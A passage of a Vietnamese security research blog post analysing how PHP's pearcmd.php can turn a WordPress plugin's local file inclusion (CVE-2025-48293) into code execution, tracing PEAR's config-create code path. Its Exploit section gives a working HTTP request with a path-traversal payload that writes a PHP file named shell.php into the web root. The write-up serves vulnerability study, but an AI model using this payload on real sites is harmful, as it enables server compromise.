</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span><span class="p">[</span><span class="nv">$layer</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&#34;unknown config file type `</span><span class="si">$layer</span><span class="s2">&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span><span class="p">[</span><span class="nv">$layer</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$data</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">configuration</span><span class="p">[</span><span class="nv">$layer</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_encodeOutput</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$opt</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="nx">dirname</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">System</span><span class="o">::</span><span class="na">mkDir</span><span class="p">(</span><span class="nv">$opt</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&#34;could not create directory: &#34;</span> <span class="o">.</span> <span class="nx">dirname</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">is_writeable</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&#34;no write access to </span><span class="si">$file</span><span class="s2">!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nx">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&#34;PEAR_Config::writeConfigFile fopen(&#39;</span><span class="si">$file</span><span class="s2">&#39;,&#39;w&#39;) failed (</span><span class="si">$php_errormsg</span><span class="s2">)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line hl"><span class="cl">    <span class="nv">$contents</span> <span class="o">=</span> <span class="s2">&#34;#PEAR_Config 0.9</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">.</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line hl"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&#34;PEAR_Config::writeConfigFile: fwrite failed (</span><span class="si">$php_errormsg</span><span class="s2">)&#34;</span><span class="p">);</span>
</span></span><span class="line hl"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Đây là hàm quyết định việc ghi config file với <code>serialize($data)</code> để chuyển cấu hình thành chuỗi có thể lưu trữ.</p>
<p>Trở lại file <code>pearcmd.php</code>, các param được tạo và gán vào <code>$params</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">list</span><span class="p">(</span><span class="nv">$tmpopt</span><span class="p">,</span> <span class="nv">$params</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span></span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png" title="Giá trị $params trong debugger" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png" data-sub-html="<h2>params</h2><p>Giá trị $params trong debugger</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png' alt="params" height="244" width="1634"></a><figcaption class="image-caption">Giá trị $params trong debugger</figcaption>
  </figure></p>
<p>Cuối cùng, <code>$cmd</code> được thực thi bằng <code>$cmd-&gt;run()</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$ok</span> <span class="o">=</span> <span class="nv">$cmd</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$opts</span><span class="p">,</span> <span class="nv">$params</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 class="heading-element" id="flow"><span>Flow</span>
  <a href="#flow" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>Gửi GET request:</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;object_ids=2&amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/test_root_path+test_filename.php</span></span></span></code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>
<p>Web <code>include</code> <code>/usr/local/lib/php/pearcmd.php</code>.</p>
</li>
<li>
<p>PHP (register_argc_argv=On) build <code>$_SERVER['argv']</code> từ query → <code>['action=geo_mashup_query&amp;object_ids=2&amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;','config-create','/test_root_path','test_filename.php']</code>.</p>
</li>
<li>
<p><code>Console_Getopt::readPHPArgv()</code> trả <code>$argv</code>; <code>Console_Getopt::getopt2()</code> parse ra <code>$command='config-create'</code> và <code>list($tmpopt, $params)</code> trả về <code>$params=['/test_root_path','test_filename.php']</code>.</p>
</li>
<li>
<p><code>doConfigCreate()</code> chạy với <code>$params</code> do attacker kiểm soát → <code>touch()</code>/<code>realpath()</code> và <code>writeConfigFile()</code> tạo/ghi file.</p>
</li>
</ol>
<div class="details admonition info open disabled">
  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-circle-info" aria-hidden="true"></i>Thông tin</div>
  <div class="details-content">
    <div class="admonition-content"><p>File cấu hình được tạo có chứa giá trị <code>root path</code>. Nếu giá trị này bị ghi dưới dạng một thẻ PHP hợp lệ (<code>&lt;?php ... ?&gt;</code>) và <code>file</code> có thể được truy cập bởi client, webserver sẽ xử lý nội dung PHP trong file đó và đoạn mã sẽ được thực thi dẫn tới <strong>RCE</strong></p></div>
  </div>
</div><h2 class="heading-element" id="exploit"><span>Exploit</span>
  <a href="#exploit" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Tận dụng <a href="https://w41bu1.github.io/2025-10-13-cve-2025-48293/"target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-48293</a> đã phân tích để khai thác mở rộng bằng <code>pearcmd.php</code></p>
<p>Gửi request chứa LFI payload trỏ đến <code>pearcmd.php</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/wp-admin/admin-ajax.php?action=geo_mashup_query&amp;object_ids=2&amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=phpinfo();?&gt;+/var/www/html/shell.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://localhost/wp-admin/</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
</span></span><span class="line"><span class="cl"><span class="n">X-PwnFox-Color</span><span class="o">:</span> <span class="l">blue</span>
</span></span><span class="line"><span class="cl"><span class="n">Priority</span><span class="o">:</span> <span class="l">u=0, i</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Response trả về thành công</strong>:</p>
<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png" title="Response trả về thành công" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png" data-sub-html="<h2>res2</h2><p>Response trả về thành công</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png' alt="res2" height="937" width="1536"></a><figcaption class="image-caption">Response trả về thành công</figcaption>
  </figure></p>
<p>Truy cập <code>shell.php</code></p>
<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png" title="shell.php" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png" data-sub-html="<h2>shell</h2><p>shell.php</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png' alt="shell" height="1078" width="1919"></a><figcaption class="image-caption">shell.php</figcaption>
  </figure></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Nội dung liên quan</h2>
    <ul><li>
          <a href="/vi/posts/2025-10-21-cve-2025-32141/" title="CVE-2025-32141 Analysis &amp; POC">CVE-2025-32141 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-20-cve-2025-52716/" title="CVE-2025-52716 Analysis &amp; POC">CVE-2025-52716 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-19-cve-2025-6715/" title="CVE-2025-6715 Analysis &amp; POC">CVE-2025-6715 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-18-cve-2025-26909/" title="CVE-2025-26909 Analysis &amp; POC">CVE-2025-26909 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-17-cve-2025-39399/" title="CVE-2025-39399 Analysis &amp; POC">CVE-2025-39399 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-16-cve-2025-30782/" title="CVE-2025-30782 Analysis &amp; POC">CVE-2025-30782 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-15-cve-2025-30868/" title="CVE-2025-30868 Analysis &amp; POC">CVE-2025-30868 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-14-cve-2025-32654/" title="CVE-2025-32654 Analysis &amp; POC">CVE-2025-32654 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-13-cve-2025-48293/" title="CVE-2025-48293 Analysis &amp; POC">CVE-2025-48293 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-12-cve-2025-53328/" title="CVE-2025-53328 Analysis &amp; POC">CVE-2025-53328 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Cập nhật ngày 2025-10-22 20:48:00">Cập nhật ngày 2025-10-22&nbsp;</span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.md" title="Đọc với định dạng Markdown" class="link-to-markdown">Đọc với định dạng Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.vi.md?plain=1" title="Xem mã nguồn"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">Xem mã nguồn</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.vi.md" title="Chỉnh sửa trang này"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Chỉnh sửa trang này</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20Exploiting&#43;LFI2RCE&#43;Vulnerability&#43;via&#43;PHP&#43;PEARCMD&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cExploiting&#43;LFI2RCE&#43;Vulnerability&#43;via&#43;PHP&#43;PEARCMD%7c%0A%7cURL%7chttp://localhost:1313/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.vi.md?plain=1%7c" title="Báo cáo lỗi"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Báo cáo lỗi</a></span><span><a href="vscode://file//home/w41bu1/Desktop/w41bu1.github.io/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.vi.md" title="Mở trong trình chỉnh sửa"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Mở trong trình chỉnh sửa</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="twitter" data-url="http://localhost:1313/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/" data-title="Exploiting LFI2RCE Vulnerability via PHP PEARCMD" data-hashtags="analyst,lfi,plugin,pearcmd"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/" data-title="Exploiting LFI2RCE Vulnerability via PHP PEARCMD"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/vi/tags/analyst/" class="post-tag" title="Nhãn - Analyst">Analyst</a><a href="/vi/tags/lfi/" class="post-tag" title="Nhãn - Lfi">Lfi</a><a href="/vi/tags/plugin/" class="post-tag" title="Nhãn - Plugin">Plugin</a><a href="/vi/tags/pearcmd/" class="post-tag" title="Nhãn - Pearcmd">Pearcmd</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
    </section>
  </div><div class="post-nav"><a href="/vi/posts/2025-10-22-cve-2025-11361/" class="post-nav-item" rel="prev" title="CVE-2025-11361 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-11361 Analysis &amp; POC</a><a href="/vi/posts/2025-10-23-cve-2023-36679/" class="post-nav-item" rel="next" title="CVE-2023-36679 Analysis &amp; POC">CVE-2023-36679 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Nội dung"><h2 class="toc-title">Nội dung&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">Cung cấp bởi <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.152.2"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Chủ đề - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.0-alpha.2-20251023040336-063af2cd"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Tổng khách truy cập'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Tổng lượt truy cập'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Lên trên"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Trang web này hoạt động tốt nhất khi JavaScript được kích hoạt.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/config/page.js" defer></script><script src="/js/theme.min.js" defer></script></body>
</html>
